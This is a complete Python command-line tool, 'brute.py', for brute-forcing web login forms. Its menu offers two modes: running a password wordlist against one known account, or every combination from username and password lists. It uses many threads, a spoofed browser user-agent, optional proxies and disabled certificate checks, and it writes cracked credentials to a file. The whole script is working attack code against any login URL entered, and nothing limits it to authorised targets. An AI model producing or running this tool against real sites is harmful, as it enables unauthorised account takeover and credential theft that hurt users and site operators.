#!/usr/bin/env python3
# brute.py — HTTP Form Brute Force Tool
# Runtime: Python 3.8+  |  pip install requests colorama

import requests
import threading
import sys
import os
import time
from queue import Queue
from colorama import Fore, Style, init

init(autoreset=True)

urllib_imported = False
try:
    import urllib3
    urllib3.disable_warnings()
    urllib_imported = True
except:
    pass

# ─── Banner ───────────────────────────────────────────────────────────────────

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════╗
║                                                      ║
║   ██████╗ ██████╗ ██╗   ██╗████████╗███████╗        ║
║   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝        ║
║   ██████╔╝██████╔╝██║   ██║   ██║   █████╗          ║
║   ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝          ║
║   ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗        ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝        ║
║                                                      ║
║         HTTP Form Login Brute Force Tool             ║
║              @#9002111185000# Edition                ║
╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

MENU = f"""
{Fore.YELLOW}  ┌─────────────────────────────────────┐
  │            MAIN MENU                │
  ├─────────────────────────────────────┤
  │  [1]  Password Brute Force          │
  │       (Known username, try passwords│
  │                                     │
  │  [2]  Username + Password Attack    │
  │       (Try both from files)         │
  │                                     │
  │  [0]  Exit                          │
  └─────────────────────────────────────┘{Style.RESET_ALL}
"""

# ─── Shared State ─────────────────────────────────────────────────────────────

found_flag = threading.Event()
attempt_count = 0
lock = threading.Lock()

# ─── Core ─────────────────────────────────────────────────────────────────────

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear()
    print(BANNER)

def load_file(path, label="file"):
    path = path.strip()
    if not os.path.isfile(path):
        print(f"{Fore.RED}[-] {label} not found: {path}{Style.RESET_ALL}")
        return None
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f if l.strip()]
    print(f"{Fore.GREEN}[+] Loaded {len(lines)} entries from {path}{Style.RESET_ALL}")
    return lines

def save_hit(url, username, password):
    with open("cracked.txt", "a") as f:
        f.write(f"{url} | {username} | {password}\n")

def try_login(session, url, user_field, pass_field,
              username, password, fail_string, proxies):
    global attempt_count
    payload = {user_field: username, pass_field: password}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url,
    }
    try:
        resp = session.post(url, data=payload, headers=headers,
                            proxies=proxies, timeout=10,
                            allow_redirects=True, verify=False)
        with lock:
            attempt_count += 1
        if fail_string.lower() not in resp.text.lower():
            return True, resp.status_code
        return False, resp.status_code
    except Exception as e:
        with lock:
            attempt_count += 1
        return False, "ERR"

# ─── Worker — Password Only ───────────────────────────────────────────────────

def worker_pass(url, username, user_field, pass_field,
                fail_string, queue, delay, proxies):
    session = requests.Session()
    while not found_flag.is_set():
        try:
            password = queue.get(timeout=1)
        except:
            break
        hit, status = try_login(session, url, user_field, pass_field,
                                 username, password, fail_string, proxies)
        with lock:
            tag = f"{Fore.GREEN}[HIT]" if hit else f"{Fore.WHITE}[---]"
            print(f"{tag}{Style.RESET_ALL} "
                  f"#{attempt_count:<6} "
                  f"{Fore.BLUE}{username}{Style.RESET_ALL}:"
                  f"{Fore.CYAN}{password:<20}{Style.RESET_ALL} "
                  f"[HTTP {status}]")
        if hit:
            found_flag.set()
            print(f"\n{Fore.GREEN}{'='*54}")
            print(f"  [+] CRACKED!")
            print(f"  URL      : {url}")
            print(f"  Username : {username}")
            print(f"  Password : {password}")
            print(f"{'='*54}{Style.RESET_ALL}\n")
            save_hit(url, username, password)
            break
        if delay > 0:
            time.sleep(delay)
        queue.task_done()

# ─── Worker — Username + Password ────────────────────────────────────────────

def worker_combo(url, user_field, pass_field,
                 fail_string, queue, delay, proxies):
    session = requests.Session()
    while not found_flag.is_set():
        try:
            username, password = queue.get(timeout=1)
        except:
            break
        hit, status = try_login(session, url, user_field, pass_field,
                                 username, password, fail_string, proxies)
        with lock:
            tag = f"{Fore.GREEN}[HIT]" if hit else f"{Fore.WHITE}[---]"
            print(f"{tag}{Style.RESET_ALL} "
                  f"#{attempt_count:<6} "
                  f"{Fore.BLUE}{username}{Style.RESET_ALL}:"
                  f"{Fore.CYAN}{password:<20}{Style.RESET_ALL} "
                  f"[HTTP {status}]")
        if hit:
            found_flag.set()
            print(f"\n{Fore.GREEN}{'='*54}")
            print(f"  [+] CRACKED!")
            print(f"  URL      : {url}")
            print(f"  Username : {username}")
            print(f"  Password : {password}")
            print(f"{'='*54}{Style.RESET_ALL}\n")
            save_hit(url, username, password)
            break
        if delay > 0:
            time.sleep(delay)
        queue.task_done()

# ─── Attack Runner ────────────────────────────────────────────────────────────

def run_attack(queue, worker_fn, worker_args, threads):
    global attempt_count, found_flag
    attempt_count = 0
    found_flag.clear()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker_fn, args=worker_args, daemon=True)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    if not found_flag.is_set():
        print(f"\n{Fore.RED}[-] Password not found in wordlist.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Total attempts: {attempt_count}{Style.RESET_ALL}\n")

# ─── Input Helpers ────────────────────────────────────────────────────────────

def prompt(label, default=None):
    if default:
        val = input(f"  {Fore.YELLOW}{label}{Style.RESET_ALL} [{default}]: ").strip()
        return val if val else default
    val = input(f"  {Fore.YELLOW}{label}{Style.RESET_ALL}: ").strip()
    return val

def section(title):
    print(f"\n{Fore.CYAN}── {title} {'─'*(44-len(title))}{Style.RESET_ALL}")

# ─── Mode 1: Password Brute Force ────────────────────────────────────────────

def mode_password_bruteforce():
    print_banner()
    print(f"{Fore.CYAN}  [ MODE 1 — Password Brute Force ]{Style.RESET_ALL}\n")

    section("Target")
    url = prompt("Target Login URL (e.g. http://site.com/login.php)")
    if not url:
        print(f"{Fore.RED}[-] URL required.{Style.RESET_ALL}")
        return

    section("Credentials")
    username = prompt("Username / Email")
    if not username:
        print(f"{Fore.RED}[-] Username required.{Style.RESET_ALL}")
        return

    pw_file = prompt("Password Wordlist File Path (e.g. rockyou.txt)")
    passwords = load_file(pw_file, "Password wordlist")
    if not passwords:
        return

    section("Form Fields")
    user_field = prompt("Username form field name", "email")
    pass_field = prompt("Password form field name", "pass")
    fail_str   = prompt("Failure string in response", "invalid password")

    section("Attack Options")
    try:
        threads = int(prompt("Threads", "10"))
        delay   = float(prompt("Delay between requests (seconds)", "0"))
    except ValueError:
        threads, delay = 10, 0

    proxy = prompt("Proxy URL (leave blank to skip)", "")
    proxies = {"http": proxy, "https": proxy} if proxy else None

    section("Starting Attack")
    print(f"\n  {Fore.WHITE}URL      :{Style.RESET_ALL} {url}")
    print(f"  {Fore.WHITE}Username :{Style.RESET_ALL} {username}")
    print(f"  {Fore.WHITE}Passwords:{Style.RESET_ALL} {len(passwords)} entries")
    print(f"  {Fore.WHITE}Threads  :{Style.RESET_ALL} {threads}")
    print(f"  {Fore.WHITE}Fail str :{Style.RESET_ALL} '{fail_str}'")
    if proxies:
        print(f"  {Fore.WHITE}Proxy    :{Style.RESET_ALL} {proxy}")
    print()

    queue = Queue()
    for pw in passwords:
        queue.put(pw)

    run_attack(
        queue,
        worker_pass,
        (url, username, user_field, pass_field, fail_str, queue, delay, proxies),
        threads
    )
    input(f"{Fore.YELLOW}  Press ENTER to return to menu...{Style.RESET_ALL}")

# ─── Mode 2: Username + Password Attack ──────────────────────────────────────

def mode_combo_attack():
    print_banner()
    print(f"{Fore.CYAN}  [ MODE 2 — Username + Password Attack ]{Style.RESET_ALL}\n")

    section("Target")
    url = prompt("Target Login URL (e.g. http://site.com/login.php)")
    if not url:
        print(f"{Fore.RED}[-] URL required.{Style.RESET_ALL}")
        return

    section("Wordlists")
    user_file = prompt("Username / Email List File Path")
    usernames = load_file(user_file, "Username list")
    if not usernames:
        return

    pw_file = prompt("Password Wordlist File Path (e.g. rockyou.txt)")
    passwords = load_file(pw_file, "Password wordlist")
    if not passwords:
        return

    section("Form Fields")
    user_field = prompt("Username form field name", "email")
    pass_field = prompt("Password form field name", "pass")
    fail_str   = prompt("Failure string in response", "invalid password")

    section("Attack Options")
    try:
        threads = int(prompt("Threads", "10"))
        delay   = float(prompt("Delay between requests (seconds)", "0"))
    except ValueError:
        threads, delay = 10, 0

    proxy = prompt("Proxy URL (leave blank to skip)", "")
    proxies = {"http": proxy, "https": proxy} if proxy else None

    total = len(usernames) * len(passwords)

    section("Starting Attack")
    print(f"\n  {Fore.WHITE}URL         :{Style.RESET_ALL} {url}")
    print(f"  {Fore.WHITE}Usernames   :{Style.RESET_ALL} {len(usernames)} entries")
    print(f"  {Fore.WHITE}Passwords   :{Style.RESET_ALL} {len(passwords)} entries")
    print(f"  {Fore.WHITE}Total combos:{Style.RESET_ALL} {total}")
    print(f"  {Fore.WHITE}Threads     :{Style.RESET_ALL} {threads}")
    print(f"  {Fore.WHITE}Fail str    :{Style.RESET_ALL} '{fail_str}'")
    if proxies:
        print(f"  {Fore.WHITE}Proxy       :{Style.RESET_ALL} {proxy}")
    print()

    queue = Queue()
    for u in usernames:
        for p in passwords:
            queue.put((u, p))

    run_attack(
        queue,
        worker_combo,
        (url, user_field, pass_field, fail_str, queue, delay, proxies),
        threads
    )
    input(f"{Fore.YELLOW}  Press ENTER to return to menu...{Style.RESET_ALL}")

# ─── Main Menu ────────────────────────────────────────────────────────────────

def main():
    while True:
        print_banner()
        print(MENU)

        choice = input(f"  {Fore.YELLOW}Select option:{Style.RESET_ALL} ").strip()

        if choice == "1":
            mode_password_bruteforce()
        elif choice == "2":
            mode_combo_attack()
        elif choice == "0":
            print(f"\n{Fore.CYAN}  Exiting. Roost is warm.{Style.RESET_ALL}\n")
            sys.exit(0)
        else:
            print(f"{Fore.RED}  [-] Invalid option. Try again.{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    main()
